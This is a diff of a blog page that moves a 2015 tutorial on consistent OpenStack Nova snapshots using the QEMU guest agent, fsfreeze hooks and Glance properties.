+<figure class="highlight haml"><table><tr><td class="code"><pre><div class="line">$ glance image-create --name cirros \</div><div class="line">-<span class="ruby">-disk-format raw \</span></div><div class="line">-<span class="ruby">-container-format bare \</span></div><div class="line">-<span class="ruby">-file cirros-<span class="number">0</span>.<span class="number">3.3</span>-x86_64-disk.raw \</span></div><div class="line">-<span class="ruby">-is-public True \</span></div><div class="line">-<span class="ruby">-property hw_qemu_guest_agent=yes \</span></div><div class="line">-<span class="ruby">-progress</span></div></pre></td></tr></table></figure>
+<p>Boot your virtual machine: <code>nova boot ....</code></p>
+<p>Verify that the agent is in the virtual machine:</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><div class="line">ubuntu@agent:~$ file /dev/virtio-ports/org<span class="selector-class">.qemu</span><span class="selector-class">.guest_agent</span>.<span class="number">0</span></div><div class="line">/dev/virtio-ports/org<span class="selector-class">.qemu</span><span class="selector-class">.guest_agent</span>.<span class="number">0</span>: symbolic link to ../vport2p1</div></pre></td></tr></table></figure>
+<p>Install the QEMU agent inside your VM:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><div class="line">ubuntu@agent:~$ sudo apt-get <span class="keyword">install</span> -y qemu-guest-<span class="keyword">agent</span></div><div class="line">ubuntu@<span class="keyword">agent</span>:~$ sudo mkdir /<span class="keyword">var</span>/<span class="keyword">log</span>/qemu-<span class="keyword">agent</span></div><div class="line">ubuntu@<span class="keyword">agent</span>:~$ sudo tee /etc/<span class="keyword">default</span>/qemu-guest-<span class="keyword">agent</span> &gt; /dev/<span class="literal">null</span> &lt;&lt;EOF</div><div class="line">DAEMON\_ARGS=<span class="string">"--logfile /var/log/qemu-agent/org.qemu.guest_agent.0.log --fsfreeze-hook --verbose"</span></div><div class="line">EOF</div><div class="line">ubuntu@<span class="keyword">agent</span>:~$ sudo service qemu-guest-<span class="keyword">agent</span> restart</div><div class="line"> * Restarting QEMU Guest <span class="keyword">Agent</span> qemu-qa</div><div class="line"> *    ...done</div><div class="line"> *    ubuntu@<span class="keyword">agent</span>:~$ sudo ls /<span class="keyword">var</span>/<span class="keyword">log</span>/qemu-<span class="keyword">agent</span>/</div><div class="line"> *    org.qemu.guest_agent<span class="number">.0</span>.log</div></pre></td></tr></table></figure>
+<p>Now go back on the hypervisor and check that the socket file is present (it must here since we have the character device inside the virtual machine):</p>
+<figure class="highlight crystal"><table><tr><td class="code"><pre><div class="line">$ sudo bash -c  <span class="string">"ls /var/lib/libvirt/qemu/*.sock"</span></div><div class="line">/var/<span class="class"><span class="keyword">lib</span>/<span class="title">libvirt</span>/<span class="title">qemu</span>/<span class="title">capabilities</span>.<span class="title">monitor</span>.<span class="title">sock</span>  /<span class="title">var</span>/<span class="title">lib</span>/<span class="title">libvirt</span>/<span class="title">qemu</span>/<span class="title">org</span>.<span class="title">qemu</span>.<span class="title">guest_agent</span>.0.<span class="title">instance</span>-00000007.<span class="title">sock</span></span></div><div class="line"></div><div class="line">$ sudo file /var/<span class="class"><span class="keyword">lib</span>/<span class="title">libvirt</span>/<span class="title">qemu</span>/<span class="title">org</span>.<span class="title">qemu</span>.<span class="title">guest_agent</span>.0.<span class="title">instance</span>-00000007.<span class="title">sock</span></span></div><div class="line">/var/<span class="class"><span class="keyword">lib</span>/<span class="title">libvirt</span>/<span class="title">qemu</span>/<span class="title">org</span>.<span class="title">qemu</span>.<span class="title">guest_agent</span>.0.<span class="title">instance</span>-00000007.<span class="title">sock</span>: <span class="title">socket</span></span></div></pre></td></tr></table></figure>
+<p>Test if the QEMU agent responds:</p>
+<figure class="highlight smali"><table><tr><td class="code"><pre><div class="line">$ sudo virsh qemu-agent-command<span class="built_in"> instance-00000007 </span>'&#123;<span class="string">"execute"</span>:<span class="string">"guest-ping"</span>&#125;'</div><div class="line">&#123;<span class="string">"return"</span>:&#123;&#125;&#125;</div></pre></td></tr></table></figure>
+<p>Setup the fsfreeze hook mechanism, on Red Hat systems the file already exists:</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><div class="line">buntu<span class="variable">@agent</span><span class="symbol">:~</span><span class="variable">$ </span>sudo wget -O /etc/qemu/fsfreeze-hook <span class="symbol">https:</span>/<span class="regexp">/raw.githubusercontent.com/qemu</span><span class="regexp">/qemu/master</span><span class="regexp">/scripts/qemu</span>-guest-agent/fsfreeze-hook</div><div class="line">ubuntu<span class="variable">@agent</span><span class="symbol">:~</span><span class="variable">$ </span>sudo chmod +x /etc/qemu/fsfreeze-hook</div></pre></td></tr></table></figure>
+<p>Configure a basic hook, it will be executed either during the freeze or thaw operation:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">ubuntu@agent:~$ sudo mkdir /etc/qemu/fsfreeze-hook.d</div><div class="line">ubuntu@agent:~$ sudo tee &gt; /etc/qemu/fsfreeze-hook.d/foo.sh &gt; /dev/null &lt;&lt;EOF</div><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></div><div class="line">    freeze)</div><div class="line">        <span class="built_in">echo</span> <span class="string">"I'm frozen"</span> &gt; /tmp/freeze</div><div class="line">        ;;</div><div class="line">    thaw)</div><div class="line">        <span class="built_in">echo</span> <span class="string">"I'm thawed"</span> &gt;&gt; /tmp/freeze</div><div class="line">        ;;</div><div class="line">    *)</div><div class="line">        <span class="built_in">exit</span> 1</div><div class="line">        ;;</div><div class="line"><span class="keyword">esac</span></div><div class="line">EOF</div><div class="line">ubuntu@agent:~$ sudo chmod +x /etc/qemu/fsfreeze-hook.d/foo.sh</div></pre></td></tr></table></figure>
+<p>Now let’s freeze ad thaw the filesystem:</p>
+<figure class="highlight smali"><table><tr><td class="code"><pre><div class="line">$ sudo virsh qemu-agent-command<span class="built_in"> instance-00000008 </span>'&#123;<span class="string">"execute"</span>:<span class="string">"guest-fsfreeze-freeze"</span>&#125;'</div><div class="line">$ sudo virsh qemu-agent-command<span class="built_in"> instance-00000008 </span>'&#123;<span class="string">"execute"</span>:<span class="string">"guest-fsfreeze-thaw"</span>&#125;'</div></pre></td></tr></table></figure>
+<p>Did the hook work as expected? Yes!</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><div class="line">ubuntu<span class="variable">@agent</span><span class="symbol">:~</span><span class="variable">$ </span>sudo cat /tmp/freeze</div><div class="line">I<span class="string">'m frozen</span></div><div class="line">I'm thawed</div></pre></td></tr></table></figure>
+<h1 id="OpenStack-Nova-and-Snapshots"><a href="#OpenStack-Nova-and-Snapshots" class="headerlink" title="OpenStack Nova and Snapshots"></a>OpenStack Nova and Snapshots</h1><p>Several patches have been submitted to quiesce the filesystem prior to run the snapshot.</p>
+<p>The initial work to support fs-freeze while performing a snapshot of an instance was introduced in Juno with a <a href="https://review.openstack.org/#/c/99780/" target="_blank" rel="external">spec</a>.</p>
+<p>However the commit only got <a href="https://review.openstack.org/#/c/72038/9" target="_blank" rel="external">merged</a> in December…<br>This will be available in Kilo.<br>Another effort to support this feature while booting from a volume is currently under review.</p>
+<p>The original blueprint can be found <a href="https://blueprints.launchpad.net/nova/+spec/quiesced-image-snapshots-with-qemu-guest-agent" target="_blank" rel="external">here</a>.<br>Ultimately this option will be available via a Glance property:</p>
+<p><code>$ glance image-update 53bd9dbe-23db-412b-81d5-9743aabdfeb5 --property os_require_quiesce=yes</code></p>
+<p>When this option will be set and the virtual machine running the QEMU guest agent, when a user will snapshot an instance, the filesystem will get frozen and thawed after the operation.  </p>
+<pre><code>&gt; I’m really looking forward to the Kilo release now! What about you?
+</code></pre>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2015/02/09/cannot-change-locale/" itemprop="url">
                   cannot change locale
                 </a>
@@ -3236,141 +3146,6 @@ ADD static/ /www/static
 <p>运行locale</p>
 <p>LANG=en_US.UTF-8<br>LANGUAGE=<br>LC_CTYPE=”en_US.UTF-8”<br>LC_NUMERIC=”en_US.UTF-8”<br>LC_TIME=”en_US.UTF-8”<br>LC_COLLATE=”en_US.UTF-8”<br>LC_MONETARY=”en_US.UTF-8”<br>LC_MESSAGES=”en_US.UTF-8”<br>LC_PAPER=”en_US.UTF-8”<br>LC_NAME=”en_US.UTF-8”<br>LC_ADDRESS=”en_US.UTF-8”<br>LC_TELEPHONE=”en_US.UTF-8”<br>LC_MEASUREMENT=”en_US.UTF-8”<br>LC_IDENTIFICATION=”en_US.UTF-8”<br>LC_ALL=en_US.UTF-8</p>
 
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2015/02/09/perform-consistent-snapshots-with-qemu-guest-agent/" itemprop="url">
-                  Perform Consistent Snapshots with qemu guest agent
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2015-02-10T00:00:00+08:00" content="2015-02-10">
-              2015-02-10
-            </time>
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2015/02/09/perform-consistent-snapshots-with-qemu-guest-agent/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/02/09/perform-consistent-snapshots-with-qemu-guest-agent/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>A while back, I <a href="http://www.sebastien-han.fr/blog/2012/12/10/openstack-perform-consistent-snapshots/" target="_blank" rel="external">wrote an article</a> about taking consistent snapshots of your virtual machines in your OpenStack environment.<br>    However this method was really intrusive since it required to be inside the virtual machine and to manually summon a filesystem freeze.<br>    In this article, I will use a different approach to achieve the same goal without the need to be inside the virtual machine.</p>
-<p>The only requirement is to have a virtual machine running the qemu-guest-agent.</p>
-<h1 id="OpenStack-Nova-and-QEMU-guest-agent"><a href="#OpenStack-Nova-and-QEMU-guest-agent" class="headerlink" title="OpenStack Nova and QEMU guest agent"></a>OpenStack Nova and QEMU guest agent</h1><p>The QEMU guest support landed in Nova during the Havana cycle, so basically we are two release ahead.<br>This functionality is based on Glance properties.</p>
-<p>But how does that work?</p>
-<p>The principle is quite easy. A virtual machine boots with a new virtio device attached pointing to unix socket on the hypervisor. Inside the virtual machine this socket will appear as a new character device, commonly under <code>/dev/virtio-ports/</code>.</p>
-<p>A picture is always better:</p>
-<p><img src="/assets/qemu-agent-freeze-thaw.png" alt=""></p>
-<h1 id="Configure-the-QEMU-agent"><a href="#Configure-the-QEMU-agent" class="headerlink" title="Configure the QEMU agent"></a>Configure the QEMU agent</h1><p>For Ubuntu, you need to apply this fix since AppArmor will not allow the creation of the socket:</p>
-<figure class="highlight elixir"><table><tr><td class="code"><pre><div class="line"><span class="variable">$ </span>sudo echo <span class="string">"/var/lib/libvirt/qemu/*.sock rw,"</span> | sudo tee -a /etc/apparmor.d/abstractions/libvirt-qemu</div><div class="line"><span class="variable">$ </span>sudo service libvirt-bin restart</div><div class="line"><span class="variable">$ </span>sudo service nova-compute restart</div><div class="line"><span class="variable">$ </span>sudo service apparmor reload</div></pre></td></tr></table></figure>
-<p>Configure your Glance image:</p>
-<figure class="highlight haml"><table><tr><td class="code"><pre><div class="line">$ glance image-create --name cirros \</div><div class="line">-<span class="ruby">-disk-format raw \</span></div><div class="line">-<span class="ruby">-container-format bare \</span></div><div class="line">-<span class="ruby">-file cirros-<span class="number">0</span>.<span class="number">3.3</span>-x86_64-disk.raw \</span></div><div class="line">-<span class="ruby">-is-public True \</span></div><div class="line">-<span class="ruby">-property hw_qemu_guest_agent=yes \</span></div><div class="line">-<span class="ruby">-progress</span></div></pre></td></tr></table></figure>
-<p>Boot your virtual machine: <code>nova boot ....</code></p>
-<p>Verify that the agent is in the virtual machine:</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><div class="line">ubuntu@agent:~$ file /dev/virtio-ports/org<span class="selector-class">.qemu</span><span class="selector-class">.guest_agent</span>.<span class="number">0</span></div><div class="line">/dev/virtio-ports/org<span class="selector-class">.qemu</span><span class="selector-class">.guest_agent</span>.<span class="number">0</span>: symbolic link to ../vport2p1</div></pre></td></tr></table></figure>
-<p>Install the QEMU agent inside your VM:</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><div class="line">ubuntu@agent:~$ sudo apt-get <span class="keyword">install</span> -y qemu-guest-<span class="keyword">agent</span></div><div class="line">ubuntu@<span class="keyword">agent</span>:~$ sudo mkdir /<span class="keyword">var</span>/<span class="keyword">log</span>/qemu-<span class="keyword">agent</span></div><div class="line">ubuntu@<span class="keyword">agent</span>:~$ sudo tee /etc/<span class="keyword">default</span>/qemu-guest-<span class="keyword">agent</span> &gt; /dev/<span class="literal">null</span> &lt;&lt;EOF</div><div class="line">DAEMON\_ARGS=<span class="string">"--logfile /var/log/qemu-agent/org.qemu.guest_agent.0.log --fsfreeze-hook --verbose"</span></div><div class="line">EOF</div><div class="line">ubuntu@<span class="keyword">agent</span>:~$ sudo service qemu-guest-<span class="keyword">agent</span> restart</div><div class="line"> * Restarting QEMU Guest <span class="keyword">Agent</span> qemu-qa</div><div class="line"> *    ...done</div><div class="line"> *    ubuntu@<span class="keyword">agent</span>:~$ sudo ls /<span class="keyword">var</span>/<span class="keyword">log</span>/qemu-<span class="keyword">agent</span>/</div><div class="line"> *    org.qemu.guest_agent<span class="number">.0</span>.log</div></pre></td></tr></table></figure>
-<p>Now go back on the hypervisor and check that the socket file is present (it must here since we have the character device inside the virtual machine):</p>
-<figure class="highlight crystal"><table><tr><td class="code"><pre><div class="line">$ sudo bash -c  <span class="string">"ls /var/lib/libvirt/qemu/*.sock"</span></div><div class="line">/var/<span class="class"><span class="keyword">lib</span>/<span class="title">libvirt</span>/<span class="title">qemu</span>/<span class="title">capabilities</span>.<span class="title">monitor</span>.<span class="title">sock</span>  /<span class="title">var</span>/<span class="title">lib</span>/<span class="title">libvirt</span>/<span class="title">qemu</span>/<span class="title">org</span>.<span class="title">qemu</span>.<span class="title">guest_agent</span>.0.<span class="title">instance</span>-00000007.<span class="title">sock</span></span></div><div class="line"></div><div class="line">$ sudo file /var/<span class="class"><span class="keyword">lib</span>/<span class="title">libvirt</span>/<span class="title">qemu</span>/<span class="title">org</span>.<span class="title">qemu</span>.<span class="title">guest_agent</span>.0.<span class="title">instance</span>-00000007.<span class="title">sock</span></span></div><div class="line">/var/<span class="class"><span class="keyword">lib</span>/<span class="title">libvirt</span>/<span class="title">qemu</span>/<span class="title">org</span>.<span class="title">qemu</span>.<span class="title">guest_agent</span>.0.<span class="title">instance</span>-00000007.<span class="title">sock</span>: <span class="title">socket</span></span></div></pre></td></tr></table></figure>
-<p>Test if the QEMU agent responds:</p>
-<figure class="highlight smali"><table><tr><td class="code"><pre><div class="line">$ sudo virsh qemu-agent-command<span class="built_in"> instance-00000007 </span>'&#123;<span class="string">"execute"</span>:<span class="string">"guest-ping"</span>&#125;'</div><div class="line">&#123;<span class="string">"return"</span>:&#123;&#125;&#125;</div></pre></td></tr></table></figure>
-<p>Setup the fsfreeze hook mechanism, on Red Hat systems the file already exists:</p>
-<figure class="highlight elixir"><table><tr><td class="code"><pre><div class="line">buntu<span class="variable">@agent</span><span class="symbol">:~</span><span class="variable">$ </span>sudo wget -O /etc/qemu/fsfreeze-hook <span class="symbol">https:</span>/<span class="regexp">/raw.githubusercontent.com/qemu</span><span class="regexp">/qemu/master</span><span class="regexp">/scripts/qemu</span>-guest-agent/fsfreeze-hook</div><div class="line">ubuntu<span class="variable">@agent</span><span class="symbol">:~</span><span class="variable">$ </span>sudo chmod +x /etc/qemu/fsfreeze-hook</div></pre></td></tr></table></figure>
-<p>Configure a basic hook, it will be executed either during the freeze or thaw operation:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">ubuntu@agent:~$ sudo mkdir /etc/qemu/fsfreeze-hook.d</div><div class="line">ubuntu@agent:~$ sudo tee &gt; /etc/qemu/fsfreeze-hook.d/foo.sh &gt; /dev/null &lt;&lt;EOF</div><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></div><div class="line">    freeze)</div><div class="line">        <span class="built_in">echo</span> <span class="string">"I'm frozen"</span> &gt; /tmp/freeze</div><div class="line">        ;;</div><div class="line">    thaw)</div><div class="line">        <span class="built_in">echo</span> <span class="string">"I'm thawed"</span> &gt;&gt; /tmp/freeze</div><div class="line">        ;;</div><div class="line">    *)</div><div class="line">        <span class="built_in">exit</span> 1</div><div class="line">        ;;</div><div class="line"><span class="keyword">esac</span></div><div class="line">EOF</div><div class="line">ubuntu@agent:~$ sudo chmod +x /etc/qemu/fsfreeze-hook.d/foo.sh</div></pre></td></tr></table></figure>
-<p>Now let’s freeze ad thaw the filesystem:</p>
-<figure class="highlight smali"><table><tr><td class="code"><pre><div class="line">$ sudo virsh qemu-agent-command<span class="built_in"> instance-00000008 </span>'&#123;<span class="string">"execute"</span>:<span class="string">"guest-fsfreeze-freeze"</span>&#125;'</div><div class="line">$ sudo virsh qemu-agent-command<span class="built_in"> instance-00000008 </span>'&#123;<span class="string">"execute"</span>:<span class="string">"guest-fsfreeze-thaw"</span>&#125;'</div></pre></td></tr></table></figure>
-<p>Did the hook work as expected? Yes!</p>
-<figure class="highlight elixir"><table><tr><td class="code"><pre><div class="line">ubuntu<span class="variable">@agent</span><span class="symbol">:~</span><span class="variable">$ </span>sudo cat /tmp/freeze</div><div class="line">I<span class="string">'m frozen</span></div><div class="line">I'm thawed</div></pre></td></tr></table></figure>
-<h1 id="OpenStack-Nova-and-Snapshots"><a href="#OpenStack-Nova-and-Snapshots" class="headerlink" title="OpenStack Nova and Snapshots"></a>OpenStack Nova and Snapshots</h1><p>Several patches have been submitted to quiesce the filesystem prior to run the snapshot.</p>
-<p>The initial work to support fs-freeze while performing a snapshot of an instance was introduced in Juno with a <a href="https://review.openstack.org/#/c/99780/" target="_blank" rel="external">spec</a>.</p>
-<p>However the commit only got <a href="https://review.openstack.org/#/c/72038/9" target="_blank" rel="external">merged</a> in December…<br>This will be available in Kilo.<br>Another effort to support this feature while booting from a volume is currently under review.</p>
-<p>The original blueprint can be found <a href="https://blueprints.launchpad.net/nova/+spec/quiesced-image-snapshots-with-qemu-guest-agent" target="_blank" rel="external">here</a>.<br>Ultimately this option will be available via a Glance property:</p>
-<p><code>$ glance image-update 53bd9dbe-23db-412b-81d5-9743aabdfeb5 --property os_require_quiesce=yes</code></p>
-<p>When this option will be set and the virtual machine running the QEMU guest agent, when a user will snapshot an instance, the filesystem will get frozen and thawed after the operation.  </p>
-<pre><code>&gt; I’m really looking forward to the Kilo release now! What about you?
-</code></pre>
           
         
       
